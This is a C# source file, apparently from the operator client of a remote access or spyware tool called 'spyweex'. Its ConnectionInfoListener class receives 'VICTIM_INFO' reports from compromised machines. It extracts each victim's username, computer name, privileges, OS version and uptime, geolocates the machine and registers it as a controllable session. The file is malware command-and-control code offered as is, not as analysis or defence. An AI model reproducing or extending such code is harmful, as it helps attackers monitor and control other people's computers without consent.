using System;
using System.Diagnostics;
using System.Net;
using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Windows;
using System.Xml.Linq;
using System.Xml.XPath;

namespace spyweex_client_wpf.Subscribers
{
    public class ConnectionInfoListener : ISubscriber
    {
        public void Subscribe(ViewModel viewModel, WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.CurrentThread).
                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.VICTIM_INFO)).
                Subscribe(
                response =>
                {

                    Encoding enc = Encoding.GetEncoding("iso-8859-1");
                    string data = enc.GetString(response.content);

                    var jsonReader = JsonReaderWriterFactory.CreateJsonReader(
                        Encoding.Default.GetBytes(data), new System.Xml.XmlDictionaryReaderQuotas());
                    var root = XElement.Load(jsonReader);

                    IPEndPoint ipEndPoint = (IPEndPoint)wxhtpClient.getTcpClient().Client.RemoteEndPoint;
                    string ip = ipEndPoint.Address.ToString();
                    var tupleOfGeoData = Utils.GetGeoInfo("81.180.72.61");


                    Session s = new Session
                    {
                        ID = (viewModel.sessions.Count + 1).ToString(),
                        WANIP = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(),
                        LOCALIP = root.XPathSelectElement("//local_ip").Value,
                        Username = root.XPathSelectElement("//username").Value,
                        ComputerName = root.XPathSelectElement("//comp_name").Value,
                        Privileges = root.XPathSelectElement("//privs").Value,
                        OS = root.XPathSelectElement("//win_ver").Value,
                        Uptime = root.XPathSelectElement("//uptime").Value,
                        Cam = "unknown",
                        InstallDate = "unknown",
                        Country = tupleOfGeoData.Item1,
                        RegionName = tupleOfGeoData.Item2,
                        City = tupleOfGeoData.Item3,
                        Isp = tupleOfGeoData.Item4,
                        Coords = tupleOfGeoData.Item5,
                        Zip = tupleOfGeoData.Item6
                    };
                    viewModel.sessions.Add(s);
                    UnsubscribeAsync();
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in ConnectionInfoListener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;
        }
    }

}